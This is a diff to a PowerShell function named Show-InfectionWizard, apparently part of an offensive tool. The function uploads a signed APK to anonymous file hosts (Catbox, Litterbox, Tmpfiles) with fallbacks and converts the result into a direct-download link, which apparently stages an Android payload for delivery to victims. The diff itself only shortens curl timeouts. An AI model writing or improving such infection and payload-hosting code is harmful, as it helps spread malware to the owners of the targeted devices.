@@ -306,14 +306,14 @@ function Show-InfectionWizard {
         $downloadUrl = Read-Host "    Enter pre-hosted URL"
     } else {
         Write-Host "[*] Uploading to Catbox.moe..." -ForegroundColor Yellow
-        $resp = curl.exe -sS --connect-timeout 10 --max-time 180 -F "reqtype=fileupload" -F "fileToUpload=@$signedApk" https://catbox.moe/user/api.php 2>$null
+        $resp = curl.exe -sS --connect-timeout 5 --max-time 15 -F "reqtype=fileupload" -F "fileToUpload=@$signedApk" https://catbox.moe/user/api.php 2>$null
         if ($resp -notlike "http*") {
             Write-Host "[!] Catbox failed/unreachable. Trying Litterbox fallback..." -ForegroundColor Yellow
-            $resp = curl.exe -sS --connect-timeout 10 --max-time 180 -F "reqtype=fileupload" -F "time=72h" -F "fileToUpload=@$signedApk" https://litterbox.catbox.moe/resources/internals/api.php 2>$null
+            $resp = curl.exe -sS --connect-timeout 5 --max-time 15 -F "reqtype=fileupload" -F "time=72h" -F "fileToUpload=@$signedApk" https://litterbox.catbox.moe/resources/internals/api.php 2>$null
         }
         if ($resp -notlike "http*") {
             Write-Host "[!] Litterbox failed/unreachable. Trying Tmpfiles.org fallback..." -ForegroundColor Yellow
-            $json = curl.exe -sS --connect-timeout 10 --max-time 180 -F "file=@$signedApk" https://tmpfiles.org/api/v1/upload 2>$null
+            $json = curl.exe -sS --connect-timeout 5 --max-time 15 -F "file=@$signedApk" https://tmpfiles.org/api/v1/upload 2>$null
             if ($json -match '"url":"([^"]+)"') {
                 $rawUrl = $matches[1]
                 $resp = $rawUrl -replace "tmpfiles.org/", "tmpfiles.org/dl/"
